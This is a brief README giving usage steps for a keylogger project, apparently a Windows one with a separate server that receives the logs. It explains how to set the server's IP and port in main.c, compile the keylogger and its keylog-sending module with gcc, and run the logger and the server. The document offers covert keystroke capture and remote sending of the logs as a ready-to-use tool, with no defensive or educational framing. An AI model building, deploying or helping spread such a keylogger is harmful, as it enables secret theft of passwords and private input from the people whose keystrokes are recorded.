# keylogger Usage

### To run Keylog server:
- .\bin\server_keylogger.exe \<IP> \<Port>


### To run keylogger:
- First open main.c and change the IP address and Port number to your preference and compile the code as follows
    
    - gcc -o ../bin/keylogger.exe .\src\main.c .\src\keylogger.c .\src\send_keylog.c  -lws2_32
    - Then go to your bin folder and run keylogger.exe as follows:
        .\keylogger.exe

